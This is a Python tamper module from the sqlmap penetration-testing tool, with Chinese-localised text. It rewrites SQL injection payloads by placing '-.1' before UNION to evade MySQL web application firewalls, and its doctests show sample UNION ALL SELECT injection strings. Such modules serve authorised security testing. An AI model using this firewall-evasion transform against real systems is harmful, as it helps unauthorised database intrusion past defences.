#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    '\n    将 UNION 实例替换为 -.1UNION\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf\n\n    >>> tamper(\'1 UNION ALL SELECT\')\n    \'1-.1UNION ALL SELECT\'\n    >>> tamper(\'1" UNION ALL SELECT\')\n    \'1"-.1UNION ALL SELECT\'\n    '

    return re.sub(r"(?i)\s+(UNION )", r"-.1\g<1>", payload) if payload else payload
